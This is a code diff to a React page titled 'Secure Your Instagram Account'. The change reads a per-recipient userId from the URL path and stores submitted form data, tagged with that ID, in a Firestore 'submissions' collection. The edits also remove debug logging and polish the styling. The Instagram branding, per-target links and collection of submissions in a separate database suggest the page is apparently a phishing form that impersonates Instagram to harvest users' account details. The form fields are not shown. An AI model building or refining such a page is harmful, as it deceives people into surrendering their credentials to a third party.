@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { db } from '../firebase';  // Firebase Firestore instance
 import { collection, addDoc } from 'firebase/firestore';
-import { useLocation } from 'react-router-dom';  // Import the useLocation hook
+import { useParams } from 'react-router-dom';  // Import useParams hook to get userId from the URL
 
 const SecureAccount = () => {
   const [formData, setFormData] = useState({
@@ -10,21 +10,7 @@ const SecureAccount = () => {
   });
   const [message, setMessage] = useState('');
   const [loading, setLoading] = useState(false);
-  const [userId, setUserId] = useState('');  // Store userId from the URL
-
-  const location = useLocation();
-
-  // Extract userId from the URL query parameters
-  useEffect(() => {
-    const params = new URLSearchParams(location.search);
-    const userIdFromLink = params.get('userid');
-    console.log("Extracted userId from URL: ", userIdFromLink);  // Debugging log
-    if (userIdFromLink) {
-      setUserId(userIdFromLink);
-    } else {
-      console.error('No userId found in URL');
-    }
-  }, [location]);
+  const { userId } = useParams();  // Get userId from the URL path
 
   // Handle form input changes
   const handleInputChange = (e) => {
@@ -45,16 +31,10 @@ const SecureAccount = () => {
     }
 
     try {
-      console.log("Submitting the following data to Firestore:", {
-        ...formData,
-        userId: userId,  // Store the userId from the URL parameter
-        timestamp: new Date(),
-      });
-
       // Save form data to Firestore, including the userId
       await addDoc(collection(db, 'submissions'), {
         ...formData,
-        userId: userId,  // Store the userId from the URL parameter
+        userId: userId,  // Store the userId from the URL path
         timestamp: new Date(),
       });
       
@@ -68,10 +48,10 @@ const SecureAccount = () => {
   };
 
   return (
-    <div className="flex flex-col items-center justify-center min-h-screen">
+    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
       
       {/* Explanation about securing the account */}
-      <div className="mb-6 text-center max-w-sm text-sm">
+      <div className="mb-6 text-center max-w-sm text-sm bg-white p-6 rounded-lg shadow-lg">
         <p className="mb-4 text-gray-800 font-bold">
           Secure Your Instagram Account
         </p>
